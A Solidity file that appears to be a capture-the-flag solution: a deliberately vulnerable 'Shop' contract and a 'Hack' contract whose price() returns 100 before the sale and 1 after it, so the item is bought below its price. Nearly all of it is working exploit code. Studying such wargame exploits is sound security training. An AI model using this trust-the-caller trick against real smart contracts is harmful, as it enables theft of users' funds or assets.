// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
interface ShopI {
    function buy() external;
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
}
contract Hack is Buyer {
    ShopI public shopI;

    constructor(address _shop) {
        shopI = ShopI(_shop);
    }

    function pwn() public {
        shopI.buy();
    }

    bool public togle = true;

    function price() external view returns (uint256) {
        if (shopI.isSold()) {
            return 1;
        }
        return 100;
    }
}
